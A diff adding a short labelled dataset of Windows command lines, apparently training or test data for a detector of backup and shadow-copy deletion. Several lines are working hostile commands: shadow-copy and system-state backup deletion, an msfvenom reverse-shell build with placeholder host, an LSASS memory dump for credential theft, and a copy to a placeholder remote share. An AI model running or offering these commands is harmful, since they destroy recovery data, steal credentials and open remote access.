@@ -1,0 +1,10 @@
+1	wbadmin delete systemstatebackup -keepVersions:0
+1	cmd.exe /c "vssadmin.exe delete shadows /all /quiet"
+1	cmd.exe /c "wmic.exe shadowcopy delete"
+1	cmd.exe /c "wbadmin delete systemstatebackup -keepVersions:0"
+1	powershell -c "wbadmin delete systemstatebackup -keepVersions:0"
+0	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	compress ${source_file_path}
+0	powershell -c  "rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).id  lsassdump.dmp full"
+0	xcopy ${source_file_path} \\${ip_address}\${destination_file_path} /Y
+0	7z a archive.zip ${source_file_path}
